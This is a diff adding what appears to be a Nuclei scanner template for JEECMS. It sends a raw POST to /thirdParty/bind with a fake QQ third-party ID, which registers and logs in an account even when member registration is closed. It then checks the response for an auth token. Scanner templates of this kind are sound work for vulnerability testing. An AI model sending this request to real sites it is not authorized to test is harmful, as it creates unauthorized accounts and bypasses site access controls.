@@ -1,0 +1,29 @@
+id: JEECMS-bind-register
+info:
+  name: JEECMS-bind-register
+  author: apple
+  severity: low
+  description: 首先需要先登录会员。如果站点正常开放会员注册的话，直接注册即可。但对于一种更严格的情况，就是当站点关闭会员注册时，需要通过别的手段来登录。这里可以利用第三方登录的功能，通过/thirdParty/bind接口可以实现注册并且能够直接登录（该接口在关闭第三方登录时仍旧有效）。
+  reference:
+    - https://forum.butian.net/share/158
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /thirdParty/bind HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        Redirect-Header: false
+        X-Requested-With: X MLHttpRequest
+        Content-Length: 78
+
+        {"username":"xixihaha","loginWay": 1, "loginType": "QQ", "thirdId": "abcdefg"}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'JEECMS-Auth-Token'
